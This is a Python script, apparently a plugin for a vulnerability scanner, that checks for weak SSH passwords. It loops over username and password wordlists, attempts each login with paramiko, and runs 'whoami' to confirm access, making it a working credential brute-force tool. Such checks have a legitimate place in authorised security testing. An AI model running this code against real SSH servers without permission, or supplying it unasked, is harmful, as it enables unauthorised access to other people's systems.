#!/usr/bin/env python3

'''
name: SSH 弱口令漏洞
description: SSH 弱口令漏洞
'''

import time
import paramiko
from urllib.parse import urlparse

class Ssh_Weakpwd_BaseVerify:
    def __init__(self, url):
        self.url = url
        self.timeout = 3
        url_parse = urlparse(self.url)
        self.host = url_parse.hostname
        self.port = url_parse.port
        if not self.port:
            self.port = '22'

    def run(self):
        for user in open('app/username.txt', 'r', encoding = 'utf-8').readlines():
            user = user.strip()
            for pwd in open('app/password.txt', 'r', encoding = 'utf-8').readlines():
                if pwd != '':
                    pwd = pwd.strip()
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                time.sleep(1)
                try:
                    ssh.connect(hostname = self.host, port = self.port, username = user, password = pwd, timeout=2, allow_agent = False, look_for_keys = False)
                    stdin, stdout, stderr = ssh.exec_command('whoami', timeout = 1)
                    resultname = stdout.read().decode('utf-8').split("\n")[0]
                    if resultname == user:
                        print('存在SSH弱口令漏洞')
                        return True
                except Exception as e:
                    #print(e)
                    pass
                finally:
                    ssh.close()
                    pass
        print('不存在SSH弱口令漏洞')
        return False

if  __name__ == "__main__":
    Ssh_Weakpwd = Ssh_Weakpwd_BaseVerify('http://127.0.0.1')
    Ssh_Weakpwd.run()